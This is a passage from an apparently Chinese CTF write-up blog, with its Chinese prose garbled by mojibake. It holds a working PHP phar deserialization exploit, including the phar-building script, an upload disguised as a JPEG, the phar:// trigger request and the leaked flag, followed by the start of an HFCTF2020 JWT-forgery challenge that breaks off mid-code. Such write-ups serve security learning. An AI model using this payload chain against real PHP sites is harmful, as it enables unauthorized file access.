</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>open</span>($filename) {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span> <span style=color:#f92672>=</span> $filename;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>file_exists</span>($filename) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>is_dir</span>($filename)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>name</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>basename</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>size</span>() {
</span></span><span style=display:flex><span>        $size <span style=color:#f92672>=</span> <span style=color:#a6e22e>filesize</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>);
</span></span><span style=display:flex><span>        $units <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39; B&#39;</span>, <span style=color:#e6db74>&#39; KB&#39;</span>, <span style=color:#e6db74>&#39; MB&#39;</span>, <span style=color:#e6db74>&#39; GB&#39;</span>, <span style=color:#e6db74>&#39; TB&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $size <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>1024</span> <span style=color:#f92672>&amp;&amp;</span> $i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>4</span>; $i<span style=color:#f92672>++</span>) $size <span style=color:#f92672>/=</span> <span style=color:#ae81ff>1024</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>round</span>($size, <span style=color:#ae81ff>2</span>)<span style=color:#f92672>.</span>$units[$i];
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>detele</span>() {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>unlink</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>close</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>file_get_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span> <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>close</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>file_get_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>);
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>æ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œæ‰“ä¸€ä¸ªpharåŒ…</p><p>æŒ‰é“ç†å¯ä»¥è¿™ä¹ˆåˆ©ç”¨ï¼Œè°ƒç”¨closeè¿›è¡Œåˆ©ç”¨å†™å…¥å†…å®¹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span> {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> $db;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>File</span> {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> $filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/flag.txt&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$a <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>User</span>();
</span></span><span style=display:flex><span>$a<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>File</span>();
</span></span></code></pre></div><p>ä½†æ˜¯æ— å›æ˜¾ï¼Œåˆ©ç”¨FileListçš„callå‡½æ•°çš„å¥—å±‚è¿›è¡Œè¯»å–å†…å®¹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $db;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FileList</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $files;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>files</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>File</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>File</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/flag.txt&#39;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$a <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>User</span>();
</span></span><span style=display:flex><span>$a<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>FileList</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>unlink</span>(<span style=color:#e6db74>&#39;test.phar&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$phar<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Phar</span>(<span style=color:#e6db74>&#39;test.phar&#39;</span>);
</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>startBuffering</span>();
</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>setStub</span>(<span style=color:#e6db74>&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;</span>);
</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>setMetadata</span>($a);
</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>addFromString</span>(<span style=color:#e6db74>&#34;test.txt&#34;</span>,<span style=color:#e6db74>&#34;test&#34;</span>);
</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>stopBuffering</span>();
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /upload.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 9e6676fa-87d1-40a1-85db-5b10c7969b54.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>438</span>
</span></span><span style=display:flex><span>X-Requested-With: XMLHttpRequest
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Content-Type: multipart/form-data; boundary<span style=color:#f92672>=</span>----WebKitFormBoundaryiABJjBO720jM5zkS
</span></span><span style=display:flex><span>Origin: http://9e6676fa-87d1-40a1-85db-5b10c7969b54.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Referer: http://9e6676fa-87d1-40a1-85db-5b10c7969b54.node5.buuoj.cn:81/index.php
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Cookie: PHPSESSID<span style=color:#f92672>=</span>6829a2a9286110ce4b7a533537d32d05
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>------WebKitFormBoundaryiABJjBO720jM5zkS
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span>; filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;test.jpg&#34;</span>
</span></span><span style=display:flex><span>Content-Type: image/jpeg
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;?php __HALT_COMPILER<span style=color:#f92672>()</span>; ?&gt;
</span></span><span style=display:flex><span>Â°
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /delete.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 9e6676fa-87d1-40a1-85db-5b10c7969b54.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>24</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Origin: http://9e6676fa-87d1-40a1-85db-5b10c7969b54.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Referer: http://9e6676fa-87d1-40a1-85db-5b10c7969b54.node5.buuoj.cn:81/index.php
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Cookie: PHPSESSID<span style=color:#f92672>=</span>6829a2a9286110ce4b7a533537d32d05
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>filename<span style=color:#f92672>=</span>phar://test.jpg
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Server: openresty
</span></span><span style=display:flex><span>Date: Wed, <span style=color:#ae81ff>26</span> Feb <span style=color:#ae81ff>2025</span> 16:10:46 GMT
</span></span><span style=display:flex><span>Content-Type: application/json
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>X-Powered-By: PHP/5.6.40
</span></span><span style=display:flex><span>Expires: Thu, <span style=color:#ae81ff>19</span> Nov <span style=color:#ae81ff>1981</span> 08:52:00 GMT
</span></span><span style=display:flex><span>Cache-Control: no-store, no-cache, must-revalidate, post-check<span style=color:#f92672>=</span>0, pre-check<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Pragma: no-cache
</span></span><span style=display:flex><span>Cache-Control: no-cache
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>456</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;success&#34;</span>:false,<span style=color:#e6db74>&#34;error&#34;</span>:<span style=color:#e6db74>&#34;File not exist&#34;</span><span style=color:#f92672>}</span>&lt;div id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;container&#34;</span> class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;container&#34;</span>&gt;&lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;table-responsive&#34;</span>&gt;&lt;table id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;table&#34;</span> class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;table table-bordered table-hover sm-font&#34;</span>&gt;&lt;thead&gt;&lt;tr&gt;&lt;th scope<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;col&#34;</span> class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text-center&#34;</span>&gt;Opt&lt;/th&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text-center&#34;</span>&gt;flag<span style=color:#f92672>{</span>491841fa-a3b8-4e78-b4c5-1f14dd501ae6<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>&lt;/td&gt;&lt;td class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text-center&#34;</span> filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;flag.txt&#34;</span>&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span> class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;download&#34;</span>&gt;æ¶“å¬­æµ‡&lt;/a&gt; / &lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span> class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;delete&#34;</span>&gt;é’çŠ»æ«&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;
</span></span></code></pre></div><p>åœ¨download.phpä¸­ï¼Œé™åˆ¶äº†è®¿é—®çš„ç›®å½•ï¼Œæ‰€ä»¥åªèƒ½åœ¨delete.phpä¸­åˆ©ç”¨</p><h2 id=hfctf2020easylogin>[HFCTF2020]EasyLogin</h2><p>åº”è¯¥æ˜¯jwtä¼ªé€ </p><p>çœ‹ä¸€ä¸‹app.js</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75715e>/**
</span></span></span><span style=display:flex><span><span style=color:#75715e> *  æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶
</span></span></span><span style=display:flex><span><span style=color:#75715e> *  è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD
</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>login</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#34;#username&#34;</span>).<span style=color:#a6e22e>val</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#34;#password&#34;</span>).<span style=color:#a6e22e>val</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>sessionStorage</span>.<span style=color:#a6e22e>getItem</span>(<span style=color:#e6db74>&#34;token&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>$</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/api/login&#34;</span>, {<span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span>, <span style=color:#a6e22e>authorization</span><span style=color:#f92672>:</span><span style=color:#a6e22e>token</span>})
</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>done</span>(<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>data</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> {<span style=color:#a6e22e>status</span>} <span style=color:#f92672>=</span> <span style=color:#a6e22e>data</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>status</span>) {
</span></span><span style=display:flex><span>                document.<span style=color:#a6e22e>location</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/home&#34;</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        })
</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>fail</span>(<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>xhr</span>, <span style=color:#a6e22e>textStatus</span>, <span style=color:#a6e22e>errorThrown</span>) {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>alert</span>(<span style=color:#a6e22e>xhr</span>.<span style=color:#a6e22e>responseJSON</span>.<span style=color:#a6e22e>message</span>);
</span></span><span style=display:flex><span>        });
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>register</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#34;#username&#34;</span>).<span style=color:#a6e22e>val</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#34;#password&#34;</span>).<span style=color:#a6e22e>val</span>();
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>$</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/api/register&#34;</span>, {<span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span>})
</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>done</span>(<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>data</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>token</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>data</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>sessionStorage</span>.<span style=color:#a6e22e>setItem</span>(<span style=color:#e6db74>&#39;token&#39;</span>, <span style=color:#a6e22e>token</span>);
</span></span><span style=display:flex><span>            document.<span style=color:#a6e22e>location</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/login&#34;</span>;
</span></span><span style=display:flex><span>        })
</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>fail</span>(<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>xhr</span>, <span style=color:#a6e22e>textStatus</span>, <span style=color:#a6e22e>errorThrown</span>) {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>alert</span>(<span style=color:#a6e22e>xhr</span>.<span style=color:#a6e22e>responseJSON</span>.<span style=color:#a6e22e>message</span>);
</span></span><span style=display:flex><span>        });
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>logout</span>() {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>$</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/api/logout&#39;</span>).<span style=color:#a6e22e>done</span>(<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>data</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> {<span style=color:#a6e22e>status</span>} <span style=color:#f92672>=</span> <span style=color:#a6e22e>data</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>status</span>) {
</span></span><span style=display:flex><span>            document.<span style=color:#a6e22e>location</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/login&#39;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    });
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getflag</span>() {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>$</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/api/flag&#39;</span>).<span style=color:#a6e22e>done</span>(<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>data</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> {<span style=color:#a6e22e>flag</span>} <span style=color:#f92672>=</span> <span style=color:#a6e22e>data</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#34;#username&#34;</span>).<span style=color:#a6e22e>val</span>(<span style=color:#a6e22e>flag</span>);
</span></span><span style=display:flex><span>    }).<span style=color:#a6e22e>fail</span>(<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>xhr</span>, <span style=color:#a6e22e>textStatus</span>, <span style=color:#a6e22e>errorThrown</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>alert</span>(<span style=color:#a6e22e>xhr</span>.<span style=color:#a6e22e>responseJSON</span>.<span style=color:#a6e22e>message</span>);
</span></span><span style=display:flex><span>    });
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>åˆ†æå¯çŸ¥ï¼Œè¯¥é¢˜é‡‡ç”¨äº†koaæ¡†æ¶ï¼Œåœ¨getflagå‡½æ•°é‡Œå‘ç°æœ‰ä¸ª/api/flagï¼Œåº”è¯¥æ˜¯æœ‰è¿”å›flagçš„å‡½æ•°ã€‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#http:</span><span style=color:#75715e>//153a07a4-67b8-4116-8e03-c0761cafca45.node5.buuoj.cn:81/controllers/api.js
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>crypto</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>require(&#39;crypto&#39;);</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>fs</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>require(&#39;fs&#39;)</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>jwt</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>require(&#39;jsonwebtoken&#39;)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>APIError</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>require(&#39;../rest&#39;).APIError;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>module.exports</span> <span style=color:#960050;background-color:#1e0010>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>&#39;POST</span> <span style=color:#960050;background-color:#1e0010>/api/register&#39;:</span> <span style=color:#960050;background-color:#1e0010>async</span> <span style=color:#960050;background-color:#1e0010>(ctx,</span> <span style=color:#960050;background-color:#1e0010>next)</span> <span style=color:#960050;background-color:#1e0010>=&gt;</span> <span style=color:#960050;background-color:#1e0010>{</span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>{username,</span> <span style=color:#960050;background-color:#1e0010>password</span>} <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>ctx.request.body;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>if(!username</span> <span style=color:#960050;background-color:#1e0010>||</span> <span style=color:#960050;background-color:#1e0010>username</span> <span style=color:#960050;background-color:#1e0010>===</span> <span style=color:#960050;background-color:#1e0010>&#39;admin&#39;)</span>{
</span></span><span style=display:flex><span>            <span style=color:#960050;background-color:#1e0010>throw</span> <span style=color:#960050;background-color:#1e0010>new</span> <span style=color:#960050;background-color:#1e0010>APIError(&#39;register</span> <span style=color:#960050;background-color:#1e0010>error&#39;,</span> <span style=color:#960050;background-color:#1e0010>&#39;wrong</span> <span style=color:#960050;background-color:#1e0010>username&#39;);</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>if(global.secrets.length</span> <span style=color:#960050;background-color:#1e0010>&gt;</span> <span style=color:#ae81ff>100000</span><span style=color:#960050;background-color:#1e0010>)</span> {
</span></span><span style=display:flex><span>            <span style=color:#960050;background-color:#1e0010>global.secrets</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>[];</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>secret</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>crypto.randomBytes(</span><span style=color:#ae81ff>18</span><span style=color:#960050;background-color:#1e0010>).toString(&#39;hex&#39;);</span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>secretid</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>global.secrets.length;</span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>global.secrets.push(secret)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>token</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>jwt.sign(</span>{<span style=color:#960050;background-color:#1e0010>secretid,</span> <span style=color:#960050;background-color:#1e0010>username,</span> <span style=color:#960050;background-color:#1e0010>password</span>}<span style=color:#960050;background-color:#1e0010>,</span> <span style=color:#960050;background-color:#1e0010>secret,</span> {<span style=color:#960050;background-color:#1e0010>algorithm:</span> <span style=color:#960050;background-color:#1e0010>&#39;HS256&#39;</span>}<span style=color:#960050;background-color:#1e0010>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>ctx.rest(</span>{
</span></span><span style=display:flex><span>            <span style=color:#960050;background-color:#1e0010>token:</span> <span style=color:#960050;background-color:#1e0010>token</span>
</span></span><span style=display:flex><span>        }<span style=color:#960050;background-color:#1e0010>);</span>
</span></span><span style=display:flex><span>
